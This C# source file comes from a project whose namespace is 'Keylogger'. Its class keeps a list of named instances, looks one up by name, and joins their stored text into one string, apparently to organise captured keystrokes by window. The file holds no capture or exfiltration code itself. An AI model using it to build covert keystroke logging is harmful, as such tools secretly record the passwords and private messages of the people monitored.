using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Lists
    {
        public List<Instance> InstanceList = new List<Instance>();

        public Instance IsListExisting(string InstanceName)
        {
            foreach (var instance in InstanceList)
            {
                if (instance.Name == InstanceName)
                {
                    return instance;
                }
            }
            return null;
        }

        public string CreateString()
        {
            string text = "";
            foreach (var instance in InstanceList)
            {
                text += instance.Name + System.Environment.NewLine + instance.Text + System.Environment.NewLine + System.Environment.NewLine + System.Environment.NewLine;
            }
            return text;
        }

    }
}
